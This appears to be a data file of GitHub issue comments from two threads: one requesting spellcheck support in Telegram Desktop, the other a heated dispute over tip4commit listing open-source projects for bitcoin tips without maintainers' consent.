5825	"@Innomen It's really not that easy for me, sorry :(
"
5826	"@john-preston

That's ok :) I suspect if you could, you would, out of simple kindness, which is a lot more than I can say for some people.
"
5827	"@Innomen Btw maybe you at least know where to get a set of dictionaries for the spellchecking, that are completely license-free, can be embedded into tdesktop app and are available for at least all the supported tdesktop languages? (English, Spanish, Italian, Dutch, Korean, German, Portuguese-Brazil)
"
5828	"@john-preston

There are none for english afaik. Everyone that is capable of compiling one is apparently either too narcissistic or too greedy to do it for the good of the art/species. Or, is prevented from doing so by laws designed by and for said greedy narcissists, all of whom apparently want to patent and license the vowels when they grow up.
"
5829	"What's wrong with Sonnet and its SpellCheckDecorator here? It supports HSpell, Enchant, ASpell and HUNSPELL, at least.
"
5830	"I know for sure there are hunspell dictionaries for English, Spanish, Italian, Dutch, ~~Korean,~~ German, Portuguese-Brazil, and I think they're all LGPL/scowl. Not sure about Korean dicts.

EDIT: [Here](https://github.com/changwoo/hunspell-dict-ko)'s a hunspell Korean dict with the Mozilla Public License.

EDIT2: Well the licenses vary, but are generally LGPL, BSD, GPL, etc.
"
5831	"@AndydeCleyre https://inqlude.org/libraries/sonnet.html says Platform:Linux, is it cross-platform actually?
"
5832	"@nop144d 

https://api.kde.org/frameworks/sonnet/html/index.html says:

> Supported platforms
> Linux, MacOSX, Windows
"
5833	"@auchri ah, ok. So what's the problem with this library then, if any?
"
5834	"@nop144d I don't know why nobody made a PR ;)
"
5835	"@auchri not all of us are C++ devs, and as is well known this build process is painful.
"
5836	@auchri Didn't @zaps166 on this [comment](https://github.com/telegramdesktop/tdesktop/issues/96#issuecomment-234710869) and this [comment](https://github.com/telegramdesktop/tdesktop/issues/96#issuecomment-236019723) ask about what else was needed for the PR to be accepted?
5837	I would love spell check support, even if it didn't provide suggestions, just provided the red squiggly under misspelled words.
5838	"Agreed. Even an indicator for a misspell would be greatly appreciated, I never knew how much I needed one until I realized that without it, I type like a monkey. 

You have no idea how many corrections I had to make in this comment."
5839	I feel the need to clarify that indication of a misspelling is also sufficient in my case. Assuming that simplicity speeds along implementation of course.
5840	[Telegram Desktop with Hunspell](https://github.com/zaps166/tdesktop-hunspell) ([patch](https://github.com/zaps166/tdesktop-hunspell/blob/master/Hunspell.diff) + [Arch Linux package](https://github.com/zaps166/tdesktop-hunspell/releases)).
5841	I would like it too. without spelling checking the telegram app is useless to me, as I am not a native english speaker. so it's important for me to know whether what I am typing is correct or wrong. 
5842	"@auchri I tried once. But in that time has terrible painful set up the development environment, the doc has based on debian and I have Arch Linux. 
Maybe create a docker will be the best practice."
5843	Telegram Desktop with Hunspell (patch + Arch Linux package).  - And how do you install this on say an Ubuntu machine? Thanks. 
5844	@Sbzz You can install Arch on it :>
5845	@stek29  This is needed on an Ubuntu machine. Any solution? 
5846	@Sbzz You'd have to build it on your own.
5847	@stek29 In order words, no public solution as yet. 
5848	@Sbzz If you have new glibc you can try to copy all missing/obsolete dependencies from Arch Linux to unpacked Telegram directory and set `LD_LIBRARY_PATH`.
5849	"I have built an unofficial telegram desktop client using electron and it supports spellchecker as well. 

Check it out -

https://github.com/akashnimare/telectron

![spell](https://cloud.githubusercontent.com/assets/2263909/24840730/65bea040-1d90-11e7-9f75-376cfa512849.jpg) "
5850	https://github.com/telegramdesktop/tdesktop/pull/3232
5851	@akashnimare but can't I just use any browser which has exact same spell checking, but a lot more features (like receiving notifications when tab with webogram is closed -- I can't see your app sending notifications when it's closed).
5852	Please make it happen. It shouldn't be that hard considering there are ready-made spell checking solutions out there... 
5853	want for windows if it's possible. thanks. 
5854	"any updates on that? Mozilla volunteers we use telegram a lot and will be helpful to avoid so many typos!
"
5855	@Mte90 There have been several people that have created PRs, asked for clarifications, and volunteered for to assist. And none of it has gotten a response from the project owner. Has Mozilla created created a fork with a working release for all platforms?
5856	@lordkage I've seen just one PR, and that PR got a lot of attention and help from John. 
5857	"That is awesome news!
Does that mean we are close to having resolution?"
5858	"so they just implemented the extremely important ""Autocompletion for emoji"" and still no spell checker... sad"
5859	"/type critical thing about oligarch owned insecure closed source server chat app...

""auchri deleted a comment from"" in 3... 2... 1...

Guys, seriously, never gonna happen. I'm unsubscribing now, you should do the same and try to migrate to a fully open source solution."
5860	"@Innomen Please stop posting offtopic here, this issue has nothing to do with server side source code, project ownership etc.

This is completely client-side issue and it can be done by the community with source of this app being open. So it will indeed be required to delete your offtopic comments :(

@auchri helps with issue management in his free time, he has no interest in this apart from the improvement of the application. The deleted comments were not critical, they just were meaningless, because they could be easier done by reactions."
5861	"Now, we can't remove repositories from the list, but you can turn off notifications for your projects and put a message saying you don't like this way of funding on your projects pages. ( like here https://tip4commit.com/github/django/django ) Would it be enough?

You can find your projects here https://tip4commit.com/projects/search?utf8=%E2%9C%93&query=mitsuhiko&order=balance (nobody has funded them yet)
"
5862	"I'm not at all okay with what you guys are doing, just for the record.  The only reason I discovered this is because someone forked your project and on another website money was accumulated.  They did find a way to disable it: https://github.com/sigmike/peer4commit/issues/110

> Would it be enough?

No. Not at all.  Please add support for blacklisting projects.  I do not want to be associated with this kind of thing.
"
5863	"@mitsuhiko thanks for your feedback but you are not asociated with this (if some site publishes info about your projects that doesn't mean you are associated with it).

> Please add support for blacklisting projects. 

Could you please explain the motivation behind this requested feature?

We are doing the following:

1) we distribute the **public** information about opensource projects and their contributors
2) we enable anybody to tip contributors of these projects

What is wrong with it?
"
5864	"You are collecting money using the project's name.
"
5865	"Furthermore you're notifying new contributors about the possibility to recieve money for their commit as soon as their pull requests are merged. In your current notification emails there is no implication that this might be a process not endorsed by the project maintainers -- in fact, your terse messages make people assume tip4commit was explicitly set up and endorsed by the maintainers, because nobody assumes an unendorsed third-party service would send such intrusive messages on their own.
"
5866	"Thanks for your coments, @untitaker . I think I understand the problem now.

The main problem is that some people might think that we organize crowdfunding process on behalf of project maintainers.

But we don't claim we do, that is an unintendend consequence of how we designed the system, sorry if it caused troubles.

Do you think it can be fixed by just explicitly stating that we are not affiliated with the project we collect funds for and that project maintainers might not endorse this practice?
"
5867	"That would certainly fix one problem, but of course i can't speak for @mitsuhiko. IIRC it was also not obvious in those messages whether the user would recieve more emails for further commits, or if there is any action at all needed to opt out of all of this.

But nevertheless i think tip4commit should be opt-in instead, because i consider the current tactic to be a very intrusive form of growth-hacking.
"
5868	"Email notification happens only when contributor's balance hits the threshold of 0.005 btc (that is ~2$ at current rate). Recepient needs to know that s/he received money at least once so that s/he specifies his/her bitcoin address to receive them without notification in future. And of course it is easy to unsubscribe. See https://github.com/tip4commit/tip4commit/blob/master/app/models/tip.rb#L115-L118 for details.
"
5869	"Can you please remove the projects?  Can't be that hard to do.  I really do not see much that should be discussed about this issue.
"
5870	"@mitsuhiko, everybody who visits pages devoted to your projects (https://tip4commit.com/github/mitsuhiko/werkzeug and https://tip4commit.com/github/mitsuhiko/flask) now sees a big red warning and hopefully understands that you are not affiliated with tip4commit.

Somebody added your projects to our database, I don't see much sense in removing them since anybody can add them back. Perhaps there should be a ""black list"" that prevents certain projects from being added. But I am not yet sure if we should develop this feature since motivation is not clear to me.

Why should we forbid people to send bitcoin donations to support open source project development or  to receive donations for commiting to it?

I agree that it would be nice to explicitly warn users that we are not affiliated with project maintainers (to prevent confusion as  @untitaker said). But currently it is quite obvious for the mentioned projects due to the warnings. Are your concerns resolved?
"
5871	"> Why should we prevent people from sending bitcoin donations to open source project and from receiving donations for commiting to it?

Because people don't want them.  Any donation that comes to me for instance I need to declare in my taxes and I need to provide information about where that is coming from.  Accepting money at random is not exactly making my life easier especially when it comes out of things like bitcoin.

But aside from that, there are channels in which projects can be supported and those projects usually open them up themselves.  Having random websites on the internet collect money on project's behalf is not okay in my book.

Instead of just subscribing projects make marketing and let projects sign up.  That's what gittip does, that's how patreon do etc.  And they also come with support for dealing with the paperwork.

> Are your concerns resolved?
> I can already see that this is an downhill battle so I will just accept the current proposed solution …
"
5872	"this sounds like a feature request to me - here are some suggestions for features that could be added to tip4commit
- only the repo owner or organization admins could be allowed to register their projects on tip4commit
- there could be a ""remove project and withdraw funds"" feature accessible only to the repo owner or organization admins
- individual users could opt out of receiving tips and tip4commit could publish this voluntary blacklist so that project maintainers could reject contributions from anyone who is not on that list - bear in mind that receiving tips is already on an opt-in basis - one must register a bitcoin address with tip4commit before any funds will be transfered

but regardless of any of these features - if the project source code is publicly available under a standard open source license than it is obviously not possible (not technically nor legally) to prevent someone from cloning such a project and giving tips for contributions to their clone - contributions from which the original repo would not benefit - unless the author crafts a more restrictive license that specifically discourages rewarding contributions they have not much to say on the matter

keep in mind that tip4commit is itself an open source project and someone would need to take the time to implement these features - the OP is so far the only person who desires such features so perhaps the OP would care to implement some of them
"
5873	">  the OP is so far the only person who desires such features so perhaps the OP would care to implement some of them

No, the OP isn't the only one, the Django project would be another one. And your suggestion that we should implement those features to not get spammed or affiliated with sites we don't want to be affiliated seems like a bad joke to me.
"
5874	"im just saying someone has to do it and that wont happen unless it is clearly a desirable feature - i would work on it myself if i thought it would be generally appreciated - which is why i framed the issue as a feature request
"
5875	"I think people should be free to organize themselves if they like to. Project maintainers' involvement shouldn't be required nor is expected.

Project maintainers or developers don't really need to receive tips if they don't want to. If tips are unclaimed during 30 days, they get returned to the funded project's balance (i. e. back to the donations pool). That's already implemented.

I agree that people souldn't be spammed. Notification threshold is also already implemented and can be raised if needed, users don't receive emails for microdonations anymore.

What needs to be done is we should explicitly state that we are not affiliated with project maintainers in our emails and on the site. 
"
5876	"> I agree that people souldn't be spammed. Notification threshold is also already implemented and can be raised if needed, users don't receive emails for microdonations anymore.

You still choose to ignore the fact that sending emails without prior consent in a system like yours is illegal in many countries. Treshholds or not, you are just waiting till someone is annoyed enough to sue you.
"
5877	"Frankly speaking I am not quite familiar with laws of many countries nor I have enough money to hire a bunch of international lawyers.  Do I need to learn all the laws of all the countries before publishing anything online or may I just use the common sense and conscience please?
"
5878	"Frankly speaking you can publish anything (well, most things) online, but as soon as you send unsolicited emails you have to bother with laws.
"
5879	"I don't think unsolicited email is the right term for the situation when somebody sent you a tip (otherwise that term would apply to any invitation to any social network, for example).

AFAIK in my country there is no legislation of email. If you could point me to the particular law I should conform, I would be thankful.
"
5880	">  Do I need to learn all the laws of all the countries before publishing anything online or may I just use the common sense and conscience please?

To be honest: when it comes to handling money I would assume so.  If this website would be dealing with a real world currency you would have a bunch of problems on yourself at this point.  Most people would avoid holding funds on their books for an unlimited amount of time.

Don't build software you have to opt-out of and you have a lot less problems on your hand.  Right now, this is dangerously close to being sued by someone.
"
5881	"That's why this kind of project is hardly possible with traditional money. This project was created during a 48 hour rails rumble competition. The beauty of Bitcoin is that everybody can use it to create something during a weekend.

This is not a commercial project, we don't have resources to hire lawyers and accountants. And of course we don't want to harm anybody. If we see that we are damaging somebody, we'll try to fix it.

Update: It is already opt-out for everybody unless s/he receives a tip greater than threshold.
Update2: If people receive tips greater than threshold and complain - we'll rise a threshold. We are not sending endless emails to random people. I think if a person received a tip - s/he should have a chance to know about it.

Why would anybody want to sue us?

Thanks for your warnings anyway (though I am not yet sure how to deal with them).
"
5882	"opened #136 to address at least one of the problems so far
"
5883	"I'll second everything that has been said by @mitsuhiko and @apollo13 in this thread. 
- You're collecting money on our behalf (for various values of ""our""), without our permission.
- You're talking to our contributors and teasing them with promises of money for their work. 
- You're proposing to deliver this money to us without any concern for how we'll receive it, or how we'll account for it in our tax returns (are you going to issue a 1099 for US recipients? Or a group certificate for AU recipients?).
- You haven't taken any consideration for how money interacts with the commit process itself - a 1 line typo fix is valued the same as a 2000 line fix correcting a criticial transaction behavior in a database. 
- Every time we commit a typo fix, our inbox is spammed by a bunch of emails (instead of, say, accumulating in an account and sending a monthly account statement). 
- And, making the whole thing laughable, all this is being done to tell us that we've accumulated **micro-cents** of real money. 

While I'm sure you're doing this with the best of intentions, I have a great deal of difficulty finding anything about this program that isn't either offensive or laughably naïve.
"
5884	"@freakboy3742 thanks for your feedback, every comment adds significance to this thread, but have you even read it before posting?

> You're collecting money on our behalf (for various values of ""our""), without our permission.

No, we are not collecting money on anyone's behalf. We are not affiliated with project owners. Sorry if it confused anybody, we'll fix it in #136

> You're talking to our contributors and teasing them with promises of money for their work. 

We are talking only to contributors that already got some tips.

> You're proposing to deliver this money to us without any concern for how we'll receive it, or how we'll account for it in our tax returns (are you going to issue a 1099 for US recipients? Or a group certificate for AU recipients?).

That are small amount tips in Bitcoin, do they even need to be declared? If it were Linden dollars, would they need to be declared too? Recipients don't have to claim the money if they don't want it, I've mentioned it already.

> You haven't taken any consideration for how money interacts with the commit process itself - a 1 line typo fix is valued the same as a 2000 line fix correcting a criticial transaction behavior in a database. 

We don't pay for work, we just distribute a little gratuity from people who want to support the project and possibly attract more attention to it. If the commit is uselsess - don't accept it. If it is useful - why would you care if the contributor received anything for it or not?

> Every time we commit a typo fix, our inbox is spammed by a bunch of emails (instead of, say, accumulating in an account and sending a monthly account statement). 

That's not what tip4commit does. We don't spam bunch of emails. It's pretty rear event when we send out an email, see https://github.com/tip4commit/tip4commit/blob/master/app/models/tip.rb#L115-L118 for details.

> And, making the whole thing laughable, all this is being done to tell us that we've accumulated micro-cents of real money. 

This problem has been solved. No notifications about micro-cents anymore.

Well, yes, this project might seem naive, but offensive? Perhaps we made some mistakes that offended people and are sorry for that. But we worked to solve that. It is normal that not all the people like the idea. But I hardly see how it can be offensive.
"
5885	"@freakboy3742's last comment hits the nail on the head.

I am sure that your intentions are good, that you want to encourage positive things and that you want to do engage with people in a respectful way.

Unfortunately, the economics of this undermine that: being informed that I have earned a fraction of a US cent (not even a fraction of a dollar) for several hours' work is not actually encouraging, nor does it make me feel that my time or work are being valued.

Finally, despite your good intentions, and while I think that the rewards we receive for participating in open source software are real and very encouraging, I  don't think that small monetary rewards of this sort are amongst them. It seems to be missing the point, at least of my own participation.

So sorry to pour cold water and discouragement on your good intentions, but I don't think that your programme works the way you hope, and I don't think it makes people feel the way you hope.
"
5886	"@evildmp , thanks for your feedback, but as said above, **we do NOT notify users on fractions of a US cent** (or even US dollar). This was solved over a month ago. Min notification threshold is set to 0.005 btc, that is $1.75 at current rate, we might increase it if bitcoin continues to fall. Please accept apologies if you received such an email from us in the past. 

Even though not everybody likes this project, there are many developers who find it useful and claim the tips.
"
5887	"This issue feels like listening to this again : https://soundcloud.com/ryan-block-10/comcastic-service

(And it's not good)

Please just respect people if they ask you to remove them from the project. Shouldn't be that hard.
"
5888	"just FYI, this issue is currently on the front page of hacker news:
https://news.ycombinator.com/item?id=8542969
"
5889	"@arsenische You really seem to be missing the point here.  You are providing a service which inconveniences people (potential taxes), insults them (a few cents/dollars for hours of passionate work), spams them (emails for nothing more than a simple text update), and forcibly opting them into your service.
"
5890	"Opting-in in ppl is meh. Refusing to opt them out is stupid. Enjoy your PR nightmare.
"
5891	"Just want to chime in that I think this project is great, and that anyone who takes an issue with it is overreacting. It's not that hard to block incoming email, especially since it's all sent from the same domain. This also seems a lot more reasonable than complaining about people wanting to gift you money for your work.

Unless tip4commit is somehow profiting from this I don't understand why this would be a problem.
"
5892	"FWIW, in some tax jurisdictions, when you incur income or assets above a certain level, _all_ income and assets must be declared regardless of their size. In Australia, [bitcoins are treated like assets](https://www.ato.gov.au/general/gen/tax-treatment-of-crypto-currencies-in-australia---specifically-bitcoin/) and so would have to be declared for capital gains on their disposal or usage.
"
5893	"FYI this issue has been recently featured in YCombinators Hacker News. You may want to consider how it affects the public image of your project - reception so far has been overwhelmingly negative.

https://news.ycombinator.com/item?id=8542969
"
5894	"This project is not great or clever in any way.  It's not innovative, merely emulative.  The fact that you willingly infuriate people by refusing to blacklist their projects indicates contempt for the people you're pretending to help.
"
5895	"Just as a friendly tip - since this is on the top of HN now I strongly recommend you use the GitHub ""Lock"" feature in order to prevent this issue from spiraling out of relevance.
"
5896	"Assuming that the owner and contributors of a project have no interest in using your service, where does donated money go? It seems rather presumptious to assume people want to use this, as has been made abundantly clear in this issue. The result: you collect money from people ostensibly donating to a project, and don't provide a way for owners to disable that.
"
5897	"My bet is that the accrued unclaimed Bitcoin balance will magically ""disappear"" one day when they are ""hacked.""
"
5898	"@arsenische Why is it difficult to filter certain projects upon request? It would have been a far better response than what you have got your project into.
"
5899	"@Kunjan It's not difficult; it's merely the cover for the real reason they won't do it: it's a threat to their business model to eventually steal or claim the donated Bitcoins for themselves.
"
5900	"this is fraud.
"
5901	"@mence You don't actually receive any money when a tip is made. You will only receive it when actively collecting the tip, before that it is in no way your posession.

@cxromos Care to ellaborate?
"
5902	"@r04r And therein lies the fraud. Donators assume their donations go to the project maintainers, not to tip4commit. tip4commit is knowingly creating this false impression, probably with the intent to claim unclaimed Bitcoins at a future date. On one hand they are extoring project maintainers to join the network, or else ""lose"" the donations; on the other hand, they are tricking people into thinking there is a relationship between the project maintainers and tip4commit.

In giant letters on their homepage:

""Contribute to Open Source
Donate bitcoins to open source projects or make commits and get tips for it.""

Donators should be very, very leery of tip4commit as it is most likely a scam to collect Bitcoins at their own controlled addresses and eventually simply steal the Bitcoins outright.
"
5903	"if you did not made this project in an agreement between the project owners and potential contributors in money you have done nothing to earn a good faith in your intentions and have left a wide gap for misuse. simply put no one trusts you and i see no reason why someone should. the very idea of project, even if in good faith, sucks.
"
5904	"The thing that boggles me is that this was made ""at a 48 hour rails rumble"" and is not a core business or anything. Overwhelmingly people do not want this, just take it down and move on.
"
5905	"@nathan-alden I don't see how they are tricking people. The front page ""How does it work?"" blurb is fairly clear:

> People donate bitcoins to projects. When someone's commit is accepted into the project repository, we automatically tip the author.

I can't find any claims anywhere that they are affiliated with these projects. I went to the ""Supported Projects"" page which made it immediately clear that I can add any new github project by adding its URL.
"
5906	"This request does not make sense and I think many people requesting project removal misunderstand the focus of the service. Removing your project from this service will not do what it seems is widely desired. The service does not collect money on behalf of any project, it is an attempt to enable individuals to throw money at other individuals who they would like to pay for their work on a certain project.

I understand the affiliation concerns (which have been addressed), and the desire to blacklist your project for personal objections to paid code in your project or the like, but these are extraneous and feels like people going overboard with bashing on a few careless (but ultimately harmless) defaults.

There may be multiple issues with when or how often emails are sent to users who have not opted-in to the service, or how the funds are dealt with after the 30 day period, but they're not relevant here to this issue; and THIS request makes no sense given the reasoning behind it.
"
5907	"Blacklist my repositories. I do not want a part of this.
"
5908	"#tip4commit what you could have done, is make a site where project owners can login via github and register their projects for money contributions. i'm sure there are, or case could be made, for tax exempts. advertise that site, attract the right audience in the right way, give them control over their accounts on the site, contributors (both) and the other aspects of an open source project on github. you could have charge for it in some amount just to keep the wheels turning and to prove to the community you are 'one of them'. it would be a real project idea, and more importantly, the right execution. at the end you would have helped the community if the site and the idea was to be successful. it is very hard to believe that you do not understand how what i just described is diametrically opposed of what you have done. you might very well damage the projects since every open source project has its dynamic and its contributors are communities, friends. you cannot bully this in. you are just increasing the bad faith and suspicion. 
"
5909	"I support this project as it is. While I feel the request to blacklist sites is reasonable, no one is being forced to do anything here. If people want to give money to a third party with the intent of passing it on to developers, more power to them.

As long as there is a way to opt-out of the service for individual developers, I see no problem.
"
5910	"@lyndsysimon - so let us see how this can play out. due to demand bunch of junior developers rush in in search for money (in a way that is not in the spirit of building an open source project but in a wall street spirit) and clogs the development process and good developers or those who are long term contributors opt out. 
"
5911	"Relevant: https://github.com/tip4commit/tip4commit/issues/146

How do you intend to make sure that unauthorised parties do not spoof the identities of actual (and uninterested) owners in order to collect their tips, especially when the actual authors are never asked to participate?
"
5912	"@csvan I'm simply pointing out the confusion that their use of personal names in tip logs could create, and asking them to remedy it. That's all I'm doing at the moment.
"
5913	"@mitsuhiko

Talk to a lawyer, get him to sue this guy for you. Costs you a few hundreds, but it's quite painless otherwise. They'll run away scared, stop the service alltogether.

If you or anyone else is unwilling to do that, you should either complain to your government (for not providing effective means to follow up on law) or you should probably accept that this service is legal and does something permitted (or you should complain that the law is not good enough). Or maybe we're already beyond the idea that government solves problems?

That said, opt-outs might still be a good choice for tip4commit, as it prevents unlimited negative feedback. Or, maybe they're quite happy with the attention?
"
5914	"""Now, we can't remove repositories from the list"" -- Why is that so hard to do exactly?
"
5915	"As stated above, the fact that the project authors have declined to remedy this is just another reason to not trust this or their intentions. If their intentions are in good faith, this would be remedied - otherwise it's absolutely dishonest and probably fraudulent.
"
5916	"As a general question, I'm curious why folks are comfortable with anyone being able to take their hard work and use it for something else (given this is all open source projects we're talking about) but not with a service using publicly available information to give people money?

In the spirit of innovation, why should you necessarily be in control of what people do with your work if you make it publicly available so long as they reference it? (which Tip4Commit does by directly linking to your project page on GitHub).
"
5917	"Saw this on YC, similarly upset. Please remove:

https://tip4commit.com/github/SirCmpwn/Craft.Net

https://tip4commit.com/github/MediaCrush/MediaCrush
"
5918	"@nathan-alden Why are you making baseless assumptions that they are going to run with the Bitcoin? Not liking the project is one thing, but basically calling the developers thieves is way beyond that and quite pathetic.
"
5919	"@BLKSwan - i do not see anyone here from the open source claiming the right to control the use of their open source project beyond the license. it is the vice versa. the tip4commit is claiming the control over the open source project in a way not at all in the spirit of an open source project and moreover in a way that could be intentionally or unintentionally insidious. hence all the fuss. some people do not like it because it does not feel right. and it is not right. maybe you like that they picked up bitcoin but that is a limited view. you do not care for the consequences nor does the tip4commit.
"
5920	"It's pretty awesome to see that tip4commit doesn't bend to pressure from the typical project maintainers who are so used to abusing their power that they think they can force other projects to do what they want too.
"
5921	"Attention project Maintainers @alexandrz and @arsenische: If enough project maintainers are against you doing this I have no problem supporting the python community by contacting my lawyer in order to have them  in turn contact github on their behalf, and at that point we would let github deal with you.  Your move.

@mitsuhiko I know we have not always agreed on things but I support you in this.  If you need some help with this and would like me to have my lawyer send github a request to remove them please let me know.

Same goes with everybody else who is against this projects dealings. The bigger the group against them the better but honestly I think the contents of this thread, once i send it to github support, will be enough.
"
5922	"@duaneking - on what legal grounds do you intend to sick the legal people on them? What exact crime do you accuse them of?
"
5923	"> I have no problem supporting the python community by contacting my lawyer

I should clarify my comment above. I'll be composing an email to our lawyers (MediaCrush) if the response from the maintainers of this project is anything but ""I'm sorry, we've removed your repository, it won't happen again"". What you're doing is engaging in fraud, pretending to represent us and asking people for money, and then spamming contributors and tricking people into thinking that we support this cause.
"
5924	"> What you're doing is engaging in fraud, pretending to represent us and asking people for money

They never claim to represent you or anyone else. The only real problem here, from what I can see, is the possibility of third-parties to spoof actual authors in order to collect tips on their behalf. The project owners themselves collect no money whatsoever for themselves.

That said, it is clear that this would be much better off as an opt-in service rather than what it is now.
"
5925	"> They never claim to represent you or anyone else. The only real problem here, from what I can see, is the possibility of third-parties to spoof actual authors in order to collect tips on their behalf. The project owners themselves collect no money whatsoever for themselves.

Well, if they don't cooperate, our lawyers can argue about it. I'm not about to argue about it, I'm just telling it like it is.
"
5926	"@SirCmpwn Where exactly are they claiming to represent you?
"
5927	"I said I wasn't about to argue about it, and I meant it. I'm just giving them a chance to fix it amicably before we have to get lawyers involved.
"
5928	"@SirCmpwn Well from what I can see they aren't claiming to represent you anywhere on their website. But good luck with your legal proceedings and all.
"
5929	"Front page reads -

> People donate bitcoins to projects

But they do not. They are donating(not exactly) to _this_ project. This project is collecting money and spending them in the name of someone else's work without their consent. Right?
"
5930	"EDIT: Comment withdrawn to avoid pointless argument. The below is left only for the sake of context.

> I'm just giving them a chance to fix it amicably before we have to get lawyers involved.

Fix what? Asking you to substantiate your claim is not ""arguing about it"". Can you at least demonstrate that your accusation against the maintainers has some real merit, or are you simply interested in having your way (by brute force if necessary) regardless of what is actually right and fair?
"
5931	"Couple of things that struck me:
1. The project already claimed the ""tip"" when the contributer gives it. It doesn't make sense for someone to claim it again from tip4commit.
2. Instead of adding projects when it is searched, It would be better to add the project when someone actually gives the tip. This way you keep the search feature and also dont trouble others.
3. Not all people want to receive bitcoins. So some other alternative way of making the money reach the maintainer must be there.
4. If nobody has claimed the ""tip"" (it is not a tip now) so it must be refunded to the contributor with the reason.
"
5932	"And also, I'm curious. What if people ""donate"" money to a project(I mean send money to this project's maintainers in the name of another project) and then that project never gets any commit from any other contributor. What happens to that donated amount?
"
5933	"@Csvan Seconded. It seems like many of these developers are simply upset for the sake of being upset. Tip4commit has already added this to the bottom of their page:

> We are not affiliated with most of the projects, their owners might not endorse use of tip4commit. 

Legal action is very unnecessary and it just seems like many are threatening it to scare Tip4Commit, yet they don't seem to be doing anything wrong.
"
5934	"The email aspect of what you do may be illegal under US law as a result of the CAN-SPAM act.
"
5935	"If Wikipedia is correct, there is no violation of CAN-SPAM.

From Wikipedia:
CAN-SPAM, a direct response of the growing number of complaints over spam e-mails,[6] defines a ""commercial electronic mail message"" as ""any electronic mail message the primary purpose of which is the commercial advertisement or promotion of a commercial product or service (including content on an Internet website operated for a commercial purpose).""

Obviously, the primary purpose here is to give out the tip, not advertising the tip4commit service.
"
5936	"@arsenische seriously, just make the whole thing opt-in only and you will solve practically every problem you are currently getting flack for. 

Your idea itself is great, but basically forcing it on developers is a terrible move. Don't do it simply because you may find the legal wiggle-room to do so, in the end it will just ruin the whole image of your project and undermine the good you wanted to achieve with it. Maintainers who want to get onboard with your programme will do so, and for everyone else you can just add a referral feature to notify them about the project and the possibility of joining it.

I for one do not think you have ill intentions with it, but public perception is everything when it comes to running projects which involve the work of people not directly affiliated with you.
"
5937	"@bill-myers please refer to the ftc website:

http://www.business.ftc.gov/documents/bus61-can-spam-act-compliance-guide-business

If the recipient has not opted in it may be considered commercial email.
"
5938	"Are people in this thread familiar with bountysource? They are doing the exact same thing:
https://www.bountysource.com/search?query=mitsuhiko

@csvan similar to the open source concept in general which allows for permission-less innovation, I see permission-less project funding as a central part of the Tip4Commit service. Making it ""opt-in only"" removes this. Why shouldn't a subsection of a project's contributors be able to use the service just because the maintainer doesn't like it?
"
5939	"@BLKSwan I think it boils down to a question of basic social ethics. Most people, I presume, would find the idea of others collecting donations for them, funnelled through a party they have not approved, completely without their consent, objectionable. Most projects already have their own donation schemes set up which they would like to refer their supporters to instead. Project maintainers who want to use a service such as tip4commit are perfectly able to sign up for it themselves.

That is only coming at it from a subjective angle though. There is a whole slew of possible legal implications, many of them laid out both on YC and the Bitcoin subreddit:

https://news.ycombinator.com/item?id=8542969
http://www.reddit.com/r/Bitcoin/comments/2kz9x0/please_remove_mitsuhiko_this_guy_is_complaining/
"
5940	"If Tip4Commit were genuinely innocent in this, with purely good intentions, it would be opt-in right from the start. But it's not. They're most likely trying to make money with this, and just being dishonest about it.
"
5941	"@Adohgg 

> Legal action is very unnecessary and it just seems like many are threatening it to scare Tip4Commit, yet they don't seem to be doing anything wrong.

We're getting off-topic here, but in some countries this is exactly the kind of abuse a poorly structured legal system allows. In some cases the very costs and risks associated with as much as defending against a highly dubious lawsuit may be so high that the defendant is forced to settle and just agree to shut down, even if they have not done anything wrong. That is why I find it so hard to like people who would rather just sick the lawyers on somebody rather than trying to have a reasoned debate and mutual settlement. It has everything to do with intimidation and nothing to do with actually wanting to see the right thing done.
"
5942	"IANAL, but I believe [emailing people without prior consent (opt-in) is illegal](http://www.dia.govt.nz/Services-Anti-Spam-Index#three) in the country I live in, as it is in many countries. You may also be running afoul of charity or tax laws.

For your own legal safety and the sake of the projects you are trying to support your service should be opt-in, just like other services of this type (gittip/gratipay), not opt-out. Plus I doubt repository hosting services such as Github will take kindly to you spamming their users or accepting donations of their behalf without permission.
"
5943	"@csvan I guess I don't understand why you're comfortable with anyone being able to copy your work but not comfortable with random strangers being able to pay people that contribute to your projects using Tip4Commit if they so choose. No one is being coerced into using the service, it's simply providing an option to those that would like to use it leveraging publicly available information from GitHub. There's even a disclaimer on the main page that notes ""We are not affiliated with most of the projects, their owners might not endorse use of tip4commit""
"
5944	"@jugimaster - I agree about the opt-in part, I do not agree that it necessarily demonstrates ill intent. People should maintain good faith unless there is a sound basis to accuse them of fraud.
"
5945	"@BLKSwan if I place my software under a FOSS license, I am giving my explicit consent to others to copy, modify and distribute my work according to that license. I have not given them any kind of permission to raise money for my project without my consent, especially not through channels I have by no means approved.
"
5946	"@csvan - I didn't say ""fraud"", but I think they're probably trying to make money with this. Tip4Commit must have known that's exactly what the project owners would not want, which would explain why Tip4Commit didn't ask them.

But when the project owners do notice, Tip4Commit can tell everyone they were just trying to help. I'm not buying it.
"
5947	"@BLKSwan what's your association with Tip4Commit?

Note that the ""We are not affiliated with most of the projects, their owners might not endorse use of tip4commit"" was only added in the past couple of hours in response to this.

Perhaps some honesty from the beginning would've prevented this whole thing from blowing up.
"
5948	"I don't want `doctrine/*` to show up as well, please remove us. 
"
5949	"@csvan Under FOSS licenses, people generally have the right to profit from your work (e.g. Angry Birds had the right to make billions using zlib-licensed Box2D). This applies even to the (L)GPL (it is a common misunderstanding that the GPL forbids commercial use).

I see no problem with this at its most basic. In concept, I would defend the right for third parties to place bounties on work they deem useful. I think the real problem is the side effects. The maintainer doesn't want to silence the annoying notifications because it's his advertising, so you can expect him to be unreasonably stubborn (Exposure = more tips = more 1% cuts delivered to him). Also, will people start bombarding maintainers with tiny commits if this takes off, in hopes of getting a cut? Will maintainers start to reject commits out of concern that they're just for bounties (I submitted a pull request to Mitsuhiko's Jinja2 to fix a tiny typo I happened to see reading the docs. I didn't do it for pay. With tip4commit around, I may now be eyed with suspicion for things like that)
"
5950	"@BillyWM all very good and valid points.
"
5951	"@rapilabs as for me, it was pretty obvious we are not affiliated with project creators... the issue #136 was created a week ago after @untitaker informed us about the issue. Uder the pressure of current attention I just deployed a temporary urgent fix to prevent further confusion before a better solution is developed.
"
5952	"@arsenische wise actions, now go and implement that blacklist and show everyone that you aren't devious devs ;)
"
5953	"> For your own legal safety and the sake of the projects you are trying to support your service should be opt-in, just like other services of this type (gittip/gratipay), not opt-out

This.
"
